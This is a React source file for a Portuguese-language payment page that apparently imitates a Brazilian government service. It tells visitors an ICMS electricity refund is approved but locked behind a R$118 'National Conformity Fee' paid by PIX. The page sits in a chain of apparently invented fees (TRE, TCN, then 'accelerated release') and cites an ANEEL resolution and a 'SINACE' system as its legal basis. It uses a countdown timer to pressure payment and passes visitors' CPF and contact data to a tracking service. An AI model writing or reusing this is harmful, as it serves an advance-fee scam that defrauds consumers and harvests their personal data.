import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, Copy, Clipboard } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import ScrollToTop from "@/components/ScrollToTop";
import { sendPixGeneratedNotification } from "@/lib/utmify";
import { playNotificationSound } from "@/components/NotificationSound";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function PagamentoTCN() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  
  // Estados para gerenciar o pagamento
  const [pagamentoId, setPagamentoId] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [pixQrCode, setPixQrCode] = useState("");
  const [status, setStatus] = useState<"loading" | "success" | "paid" | "error">("loading");
  const [tempoRestante, setTempoRestante] = useState<number>(900); // 15 minutos em segundos
  const [copiado, setCopiado] = useState(false);
  const [verificandoPagamento, setVerificandoPagamento] = useState(false);
  
  // Valor da Taxa de Conformidade Nacional (TCN)
  const VALOR_TAXA_CONFORMIDADE = 118;
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  
  // Dados do cliente da URL
  const nome = searchParams.get("nome") || "";
  const cpf = searchParams.get("cpf") || "";
  const email = searchParams.get("email") || "";
  const telefone = searchParams.get("telefone") || "";
  const valor = searchParams.get("valor") || "";
  const pagamentoAnterId = searchParams.get("pagamento_id") || "";
  const companhia = searchParams.get("companhia") || "";
  const estado = searchParams.get("estado") || "";
  const nasc = searchParams.get("nasc") || "";
  
  // Copiar o código PIX para a área de transferência
  const copiarPix = async () => {
    if (pixCode) {
      try {
        await navigator.clipboard.writeText(pixCode);
        setCopiado(true);
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
          duration: 3000,
        });
        
        setTimeout(() => setCopiado(false), 3000);
      } catch (err) {
        toast({
          title: "Erro ao copiar código",
          description: "Não foi possível copiar o código PIX automaticamente. Por favor, copie manualmente.",
          variant: "destructive",
          duration: 3000,
        });
      }
    }
  };

  // Formatar o tempo restante em minutos e segundos
  const formatarTempoRestante = () => {
    const minutos = Math.floor(tempoRestante / 60);
    const segundos = tempoRestante % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
  };
  
  // Função para prosseguir para a página de pagamento
  const prosseguirParaPagamento = () => {
    // Redirecionar para a página de TaxaComplementar com os parâmetros necessários
    const params = new URLSearchParams();
    
    // Adicionar todos os dados necessários para a próxima página
    params.append('nome', nome);
    params.append('cpf', cpf);
    params.append('email', email);
    params.append('telefone', telefone);
    params.append('valor', valor);
    params.append('companhia', companhia);
    params.append('estado', estado);
    params.append('nasc', nasc);
    params.append('valorTCN', VALOR_TAXA_CONFORMIDADE.toString());
    params.append('pagamentoId', searchParams.get("pagamentoId") || "");
    params.append('dataPagamento', searchParams.get("dataPagamento") || new Date().toISOString());
    params.append('protocolo', protocolo);
    
    // Redirecionar para a página de taxa complementar
    setTimeout(() => {
      setLocation(`/taxa-complementar?${params.toString()}`);
    }, 500);
  };

  // Iniciar verificação de status de pagamento
  const verificarStatusPagamento = async (pagamentoId: string) => {
    setVerificandoPagamento(true);
    try {
      const response = await fetch(`/api/pagamentos/${pagamentoId}/status`);
      if (!response.ok) {
        throw new Error('Erro ao verificar o status do pagamento');
      }
      
      const data = await response.json();
      console.log("Status do pagamento:", data);
      
      if (data.status === "PAID" || data.status === "COMPLETED") {
        setStatus("paid");
        
        // Redirecionar para a página de Liberação Acelerada
        const params = new URLSearchParams();
        params.append('nome', nome);
        params.append('cpf', cpf);
        params.append('email', email);
        params.append('telefone', telefone);
        params.append('valor', valor);
        params.append('companhia', companhia);
        params.append('estado', estado);
        params.append('nasc', nasc);
        params.append('pagamento_id', pagamentoId);
        params.append('dataPagamento', new Date().toISOString());
        
        playNotificationSound();
        
        setTimeout(() => {
          setLocation(`/lar?${params.toString()}`);
        }, 2000);
      } else {
        // Continuar verificando a cada 10 segundos
        setTimeout(() => verificarStatusPagamento(pagamentoId), 10000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
      setTimeout(() => verificarStatusPagamento(pagamentoId), 15000);
    }
  };

  // Gerar pagamento PIX
  const gerarPagamentoPix = async () => {
    try {
      setStatus("loading");
      
      // Dados para criação do PIX
      const paymentData = {
        amount: 118, // R$ 118,00
        name: nome,
        email: email,
        cpf: cpf,
        phone: telefone,
        title: "Taxa de Conformidade Nacional (TCN)"
      };
      
      // Chamar API para gerar o PIX
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData),
      });
      
      if (!response.ok) {
        throw new Error('Erro ao gerar pagamento PIX');
      }
      
      const data = await response.json();
      console.log("Pagamento PIX gerado:", data);
      
      // Atualizar os estados com os dados do pagamento
      setPagamentoId(data.id);
      setPixCode(data.pixCode);
      setPixQrCode(data.pixQrCode);
      setStatus("success");
      
      // Enviar notificação para UTMify
      try {
        await sendPixGeneratedNotification(
          data.id,
          {
            name: nome,
            email: email,
            phone: telefone,
            document: cpf
          },
          11800, // R$ 118,00 em centavos
          undefined,
          "TCN" // Tipo de produto: TCN
        );
      } catch (error) {
        console.error("Erro ao enviar notificação para UTMify:", error);
      }
      
      // Iniciar verificação de status
      verificarStatusPagamento(data.id);
      
      // Iniciar contagem regressiva
      const interval = setInterval(() => {
        setTempoRestante((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(interval);
    } catch (error) {
      console.error("Erro ao gerar pagamento PIX:", error);
      setStatus("error");
      
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o pagamento PIX. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
  };
  
  // Obter parâmetros da URL ao carregar a página
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Definir protocolo baseado no CPF
    const cpf = urlParams.get('cpf') || "";
    if (cpf) {
      setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
    }
    
    // Definir data atual e data estimada de pagamento
    const dataHoje = new Date();
    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
    
    // Definir data do pagamento da primeira taxa
    const dataPagamentoParam = urlParams.get('dataPagamento');
    if (dataPagamentoParam) {
      setDataPagamento(formatarData(dataPagamentoParam));
    } else {
      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }));
    }
  }, []);
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(valor || "0"));
  const valorTaxaConformidadeFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE);
  const cpfFormatado = cpf ? formatarCPF(cpf) : "";
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Valor aprovado:</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <Clock size={12} className="mr-1" />
                  <span>Pagamento da TRE: <span className="font-medium">{dataPagamento}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Alerta de status */}
          <div className="mb-6">
            <Alert className="border-amber-500 bg-amber-50">
              <AlertTriangle className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">Status da Restituição: EM PROCESSAMENTO</AlertTitle>
              <AlertDescription className="text-amber-700">
                Seu pagamento da Taxa de Regularização (TRE) foi confirmado. Para concluir o processo de liberação, 
                é necessário o pagamento da Taxa de Conformidade Nacional (TCN).
              </AlertDescription>
            </Alert>
          </div>
          
          {/* Mensagem sobre processo de liberação */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <ReceiptText className="h-4 w-4" />
            </div>
            PROCESSO DE LIBERAÇÃO DA RESTITUIÇÃO
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="space-y-5">
              <div className="flex items-start">
                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <CheckCircle2 className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">1ª ETAPA - Taxa de Regularização Energética (TRE)</p>
                  <p className="text-sm text-gray-600">Você já realizou o pagamento da TRE com sucesso. Seu pedido foi validado e está em processamento.</p>
                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <AlertTriangle className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">2ª ETAPA - Taxa de Conformidade Nacional (TCN)</p>
                  <p className="text-sm text-gray-600">Esta taxa é necessária para validação do seu crédito no Sistema Nacional de Compensações Elétricas (SINACE) e a liberação da sua restituição.</p>
                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Pendente</Badge>
                </div>
              </div>
              
              <div className="flex items-start opacity-60">
                <div className="bg-gray-400 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <LockKeyhole className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-600">3ª ETAPA - Liberação Acelerada de Restituição (LAR)</p>
                  <p className="text-sm text-gray-500">Opção disponível apenas após quitação da Taxa de Conformidade Nacional (TCN).</p>
                  <Badge variant="outline" className="mt-1 bg-gray-100 text-gray-500 border-gray-300">Bloqueado</Badge>
                </div>
              </div>
            </div>
          </div>
          
          {/* Detalhes da taxa TCN */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <DollarSign className="h-4 w-4" />
            </div>
            TAXA DE CONFORMIDADE NACIONAL (TCN)
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="grid grid-cols-1 gap-6">
              {/* Card destacado da Taxa TCN */}
              <div className="bg-gradient-to-r from-amber-50 to-amber-100 p-4 rounded-lg border border-amber-200 shadow-sm">
                <div className="flex items-center mb-3">
                  <div className="bg-amber-500 rounded-full p-2 text-white mr-3 flex-shrink-0">
                    <FileText className="h-5 w-5" />
                  </div>
                  <div>
                    <h3 className="font-bold text-amber-800 text-lg">Taxa de Conformidade Nacional</h3>
                    <p className="text-amber-700 text-sm">2ª Etapa do processo de restituição</p>
                  </div>
                </div>
                
                <div className="bg-white rounded-md p-4 border border-amber-200 mb-4">
                  <div className="flex justify-between items-center mb-3">
                    <span className="text-gray-700 font-medium">Valor da Taxa:</span>
                    <span className="font-bold text-xl text-amber-800">{valorTaxaConformidadeFormatado}</span>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-sm">
                    <div className="flex items-center">
                      <Shield className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Conformidade obrigatória</span>
                    </div>
                    <div className="flex items-center">
                      <Timer className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Processamento em até 24h</span>
                    </div>
                    <div className="flex items-center">
                      <CheckCircle2 className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Validação SINACE</span>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-3">
                  <h4 className="font-semibold text-amber-800 flex items-center">
                    <Info className="h-4 w-4 mr-2" />
                    Objetivo da Taxa de Conformidade Nacional
                  </h4>
                  
                  <p className="text-sm text-amber-700">
                    A Taxa de Conformidade Nacional (TCN) é exigida pela Resolução ANEEL nº 1.042/2022 para validar sua 
                    restituição no Sistema Nacional de Compensações Elétricas (SINACE).
                  </p>
                  
                  <p className="text-sm text-amber-700">
                    Essa taxa garante a transferência legal dos valores entre a concessionária e o consumidor, 
                    assegurando que o crédito seja reconhecido em território nacional e que o processo 
                    siga o rito legal estabelecido pelos órgãos reguladores.
                  </p>
                </div>
                
                {status === "success" && pixQrCode && (
                  <div className="mt-6 p-4 bg-white rounded-lg border border-amber-300">
                    <h4 className="font-semibold text-center text-amber-800 mb-4">Efetue o pagamento via PIX</h4>
                    
                    <div className="flex flex-col md:flex-row gap-4 items-center">
                      <div className="flex-shrink-0 bg-white p-2 border border-amber-200 rounded-lg">
                        <img 
                          src={pixQrCode} 
                          alt="QR Code PIX" 
                          className="w-36 h-36"
                        />
                      </div>
                      
                      <div className="flex-grow space-y-4">
                        <div>
                          <p className="text-sm text-gray-700 mb-1">Código PIX copia e cola:</p>
                          <div className="relative">
                            <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
                              <div className="bg-gray-100 p-2 border-r border-gray-300">
                                <Clipboard className="h-4 w-4 text-gray-500" />
                              </div>
                              <div className="px-3 py-2 text-xs truncate flex-1 bg-gray-50">
                                {pixCode}
                              </div>
                              <button
                                onClick={copiarPix}
                                className="bg-amber-500 hover:bg-amber-600 text-white p-2 transition"
                              >
                                {copiado ? (
                                  <CheckCircle2 className="h-4 w-4" />
                                ) : (
                                  <Copy className="h-4 w-4" />
                                )}
                              </button>
                            </div>
                          </div>
                        </div>
                        
                        <div>
                          <p className="flex items-center text-sm text-gray-700">
                            <Clock className="h-4 w-4 mr-1 text-amber-600" />
                            Tempo restante: <span className="font-medium text-amber-700 ml-1">{formatarTempoRestante()}</span>
                          </p>
                          <p className="text-xs text-gray-500 mt-1">
                            Após o pagamento, você será redirecionado automaticamente.
                          </p>
                        </div>
                        
                        {verificandoPagamento && (
                          <p className="text-xs flex items-center text-blue-600">
                            <span className="animate-spin mr-1">⟳</span> Verificando pagamento...
                          </p>
                        )}
                      </div>
                    </div>
                  </div>
                )}
                
                {(status === "loading" || status === "error") && (
                  <div className="mt-6 flex justify-center">
                    <Button 
                      className="bg-amber-600 hover:bg-amber-700 text-white"
                      onClick={prosseguirParaPagamento}
                      disabled={status === "loading"}
                    >
                      {status === "loading" ? (
                        <>
                          <span className="animate-spin mr-2">⟳</span>
                          Gerando pagamento...
                        </>
                      ) : (
                        "Gerar pagamento PIX"
                      )}
                    </Button>
                  </div>
                )}
                
                {status === "paid" && (
                  <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-300 text-center">
                    <CheckCircle2 className="h-8 w-8 text-green-600 mx-auto mb-2" />
                    <h4 className="font-semibold text-center text-green-800 mb-2">Pagamento Confirmado!</h4>
                    <p className="text-sm text-green-700">
                      Seu pagamento foi processado com sucesso. Você será redirecionado em instantes...
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>
          
          {/* FAQ */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <HelpCircle className="h-4 w-4" />
            </div>
            PERGUNTAS FREQUENTES
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <h4 className="font-semibold text-[#1351B4] mb-2">O que é a Taxa de Conformidade Nacional?</h4>
                <p className="text-sm text-gray-600">
                  É uma taxa obrigatória que viabiliza a validação do processo de restituição junto aos órgãos 
                  reguladores federais, validando os dados do contribuinte e garantindo a legalidade do processo.
                </p>
              </div>
              
              <div>
                <h4 className="font-semibold text-[#1351B4] mb-2">O que acontece após o pagamento?</h4>
                <p className="text-sm text-gray-600">
                  Após o pagamento, seu processo será encaminhado para a etapa final, onde você terá a opção 
                  de agilizar o recebimento através da Liberação Acelerada de Restituição (LAR).
                </p>
              </div>
              
              <div>
                <h4 className="font-semibold text-[#1351B4] mb-2">Qual o prazo para o recebimento?</h4>
                <p className="text-sm text-gray-600">
                  O prazo padrão para recebimento é de até 30 dias úteis. Com a Liberação Acelerada (LAR), 
                  esse prazo pode ser reduzido para até 60 minutos após a aprovação.
                </p>
              </div>
              
              <div>
                <h4 className="font-semibold text-[#1351B4] mb-2">Posso acompanhar o status do meu processo?</h4>
                <p className="text-sm text-gray-600">
                  Sim, você receberá atualizações por e-mail em cada etapa, ou poderá consultar a qualquer momento 
                  utilizando seu número de protocolo em nosso sistema.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}